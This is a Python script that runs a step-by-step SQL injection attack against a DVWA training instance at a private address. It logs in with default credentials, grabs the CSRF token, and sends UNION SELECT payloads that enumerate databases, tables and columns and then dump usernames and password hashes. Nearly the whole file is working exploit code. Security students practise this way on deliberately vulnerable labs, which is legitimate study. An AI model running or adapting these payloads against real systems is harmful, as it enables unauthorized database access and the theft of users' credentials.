import requests
from bs4 import BeautifulSoup

# -------------------------------
# Configuration
# -------------------------------
dvwa_url = "http://192.168.42.223:81/"
login_url = f"{dvwa_url}/login.php"
sqli_url = f"{dvwa_url}/vulnerabilities/sqli/"

dvwa_username = "admin"
dvwa_password = "password"

# -------------------------------
# Start session
# -------------------------------
session = requests.Session()

# -------------------------------
# Helper function to extract SQLi output
# -------------------------------
def extract_sqli_output(response_text):
    soup = BeautifulSoup(response_text, "html.parser")
    # First try <pre> tag
    pre_tag = soup.find("pre")
    if pre_tag:
        return pre_tag.text.strip()
    # Otherwise try div#content
    div_content = soup.find("div", {"id": "content"})
    if div_content:
        return div_content.get_text(strip=True)
    return "[!] Could not find SQLi output"

# -------------------------------
# Helper function to parse usernames/passwords
# -------------------------------
def parse_users_passwords(output_text):
    lines = output_text.split("\n")
    users = []
    for line in lines:
        if "First name:" in line and "Surname:" in line:
            parts = line.split("Surname:")
            username = parts[0].replace("First name:", "").strip()
            password = parts[1].strip()
            users.append((username, password))
    return users

# -------------------------------
# Step 1: Get login page to fetch user_token
# -------------------------------
login_page = session.get(login_url)
soup = BeautifulSoup(login_page.text, "html.parser")
user_token = soup.find("input", {"name": "user_token"})["value"]
print(f"[+] Fetched CSRF token: {user_token}")

# Step 2: Log in with username, password, and token
login_data = {
    "username": dvwa_username,
    "password": dvwa_password,
    "Login": "Login",
    "user_token": user_token
}
resp = session.post(login_url, data=login_data)
if "Login failed" in resp.text:
    print("[!] Login failed")
    exit()
print("[+] Logged in successfully!\n")

# -------------------------------
# Step 3: Simple SQLi test
# -------------------------------
payload = "' OR '1'='1"
params = {'id': payload, 'Submit': 'Submit'}
response = session.get(sqli_url, params=params)
output = extract_sqli_output(response.text)
print("[+] Simple SQLi test output:")
print(output, "\n")

# -------------------------------
# Step 4: Enumerate databases
# -------------------------------
payload = "' UNION SELECT schema_name, null FROM information_schema.schemata-- "
params = {'id': payload, 'Submit': 'Submit'}
response = session.get(sqli_url, params=params)
output = extract_sqli_output(response.text)
print("[+] Databases found:")
print(output, "\n")

# -------------------------------
# Step 5: Enumerate tables in 'dvwa' database
# -------------------------------
payload = "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='dvwa'-- "
params = {'id': payload, 'Submit': 'Submit'}
response = session.get(sqli_url, params=params)
output = extract_sqli_output(response.text)
print("[+] Tables in dvwa database:")
print(output, "\n")

# -------------------------------
# Step 6: Enumerate columns in 'users' table
# -------------------------------
payload = "' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'-- "
params = {'id': payload, 'Submit': 'Submit'}
response = session.get(sqli_url, params=params)
output = extract_sqli_output(response.text)
print("[+] Columns in 'users' table:")
print(output, "\n")

# -------------------------------
# Step 7: Extract usernames and passwords
# -------------------------------
payload = "' UNION SELECT user, password FROM users-- "
params = {'id': payload, 'Submit': 'Submit'}
response = session.get(sqli_url, params=params)
output = extract_sqli_output(response.text)
users = parse_users_passwords(output)
print("[+] Usernames and passwords:")
for username, password in users:
    print(f"Username: {username} | Password hash: {password}")